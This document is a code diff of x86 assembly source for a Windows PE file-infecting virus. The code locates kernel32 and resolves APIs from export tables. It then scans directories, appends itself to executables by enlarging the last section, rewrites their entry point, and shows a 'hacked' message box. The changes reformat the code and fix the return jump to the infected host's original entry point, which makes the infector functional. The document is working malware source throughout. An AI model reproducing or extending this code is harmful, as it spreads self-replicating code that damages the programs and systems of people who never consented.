@@ -6,24 +6,23 @@ option casemap:none
 .data
 
 .code
-
 VirusStart:
 	call	delta
 delta:
-	pop		ebp
-	sub		ebp, offset delta
+	pop ebp
+	sub ebp, offset delta
 	mov eax, total_size	
-	mov		esi, [esp]
-	and		esi, 0FFFF0000h
+	mov esi, [esp]
+	and esi, 0FFFF0000h
 
-	call		GetK32	
-	mov		dword ptr [ebp+offset aKernel32], eax	;save kernel32.dll
+	call GetK32	
+	mov dword ptr [ebp+offset aKernel32], eax	;save kernel32.dll
 	
-	lea		edi, [ebp+offset @@Offsetz]
-	lea		esi, [ebp+offset @@Namez]
-	call		GetApis
-	call		SpecialApi
-	call		DirScan
+	lea edi, [ebp+offset @@Offsetz]
+	lea esi, [ebp+offset @@Namez]
+	call GetApis
+	call SpecialApi
+	call DirScan
 	call MessageBoxHacked
 
 
@@ -31,20 +30,24 @@ delta:
 ; MESSAGE BOX
 ;------------------------------------------------------------------------
 MessageBoxHacked PROC
+	push ebp
 	push		0
 	mov eax, offset szTopic
 	add eax, ebp
 	push eax
-	;push		offset szTopic
 	mov eax, offset szText
 	add eax, ebp
 	push eax
-	;push		offset szText
-	push		0
-	mov		eax, dword ptr [ebp+offset aMessageBoxA]
-	call		eax
+	push 0
+	mov eax, dword ptr [ebp+offset aMessageBoxA]
+	call eax
+	pop ebp
 ;-------------------------------------------------------------------------
-	mov eax, dword ptr [ebp+offset TEST1]
+	mov ecx, dword ptr [ebp+offset TEST1]
+	add ebp, offset delta
+	sub ebp, ecx
+	sub ebp, 5
+	mov eax, ebp
 	jmp eax
 
 MessageBoxHacked endp
@@ -247,7 +250,6 @@ InfectFiles:
 	cmp eax, 0h
 	jz ErrorReadExe
 	
-	mov ebx, dword ptr [ebp+offset MemoryHandle]
 	mov esi, dword ptr [ebp+offset MemoryHandle]
 	cmp word ptr [esi], "ZM"
 	jnz ErrorReadExe
@@ -281,9 +283,11 @@ StartInfect:
 	mov eax, [esi+0ch]					;eax= VirtualAddress
 	add eax, dword ptr [esi+10h]			;eax = VirtualAddress+SizeOfRawData
 	xchg eax, [edi+28h]					;eax = Original AddressOfEntryPoint
-	add eax, [edi+34h]					;eax= Original AddressOfEntryPoint+ImageBase
-
-	mov dword ptr [ebp+offset TEST1], eax
+	;add eax, [edi+34h]					;eax= Original AddressOfEntryPoint+ImageBase
+	
+	mov ecx, [edi+28h]
+	sub ecx, eax
+	mov dword ptr [ebp+offset TEST1], ecx
 	
 	mov ecx, total_size
 	add [esi+08h], ecx					;New VirtualSize= Original VirtualSize+VirusSize
@@ -304,6 +308,10 @@ StartInfect:
 	mov ebx, dword ptr [ebp+offset MemoryHandle]
 	add edi, ebx
 	add edi, eax
+
+	;mov esi, dword ptr [ebp+offset TEST1]
+	;add esi, edi
+	;mov dword ptr [ebp+offset ORIGINAL], esi
 
 	mov esi, offset VirusStart
 	add esi, ebp
@@ -432,29 +440,29 @@ CompareApi:
 	mov dh, [esi]					;dh=API function we looking for
 	cmp dl, dh						;match?
 	jne NextApi						;not match....ok...next API 
-	inc	edi						;if match, compare next byte
-	inc	esi								
-	cmp	byte ptr [esi], 0				;finish?
-	je	GetAddr						;jmp to get the address of API function
-	jmp	CompareApi						
+	inc edi						;if match, compare next byte
+	inc esi								
+	cmp byte ptr [esi], 0				;finish?
+	je GetAddr						;jmp to get the address of API function
+	jmp CompareApi						
 
 GetAddr:
-	pop	edx
-	pop	esi
-	dec	edx						;edx-1 (because edx=index point to zero -finish)
-	shl	edx, 1						;edx=edx*2
+	pop edx
+	pop esi
+	dec edx						;edx-1 (because edx=index point to zero -finish)
+	shl edx, 1						;edx=edx*2
 	
-	mov	ecx, [ebx+24h]
-	add	ecx, eax
-	add	ecx, edx					;ecx=ordinals
+	mov ecx, [ebx+24h]
+	add ecx, eax
+	add ecx, edx					;ecx=ordinals
 	
-	xor	edx,edx
-	mov	dx, [ecx]
-	shl	edx, 2						;edx=edx*4
-	mov	ecx, [ebx+1ch]					;ecx=RVA AddressOfFunctions
-	add	ecx, eax					;normalize
-	add	ecx, edx						
-	add	eax, [ecx]					;eax=address of API function we looking for 
+	xor edx,edx
+	mov dx, [ecx]
+	shl edx, 2						;edx=edx*4
+	mov ecx, [ebx+1ch]					;ecx=RVA AddressOfFunctions
+	add ecx, eax					;normalize
+	add ecx, edx						
+	add eax, [ecx]					;eax=address of API function we looking for 
 	ret
 	
 GetApi	endp
@@ -475,7 +483,7 @@ SpecialApi	proc
 	;mov esi, offset sMessageBoxA
 	;push esi
 	push eax
-	mov		eax, dword ptr [ebp+offset aGetProcAddress]
+	mov eax, dword ptr [ebp+offset aGetProcAddress]
 	call eax
 	
 	
@@ -559,6 +567,7 @@ PEHeader			dd	00000000h
 InfectFlag			dd	00000000h
 OriFileSize			dd	00000000h
 TEST1				dd 	00000000h
+ORIGINAL			dd 	00000000h
 ByteRead			dd	?
 
 User32Dll			db	"User32.dll", 0			;User32.dll
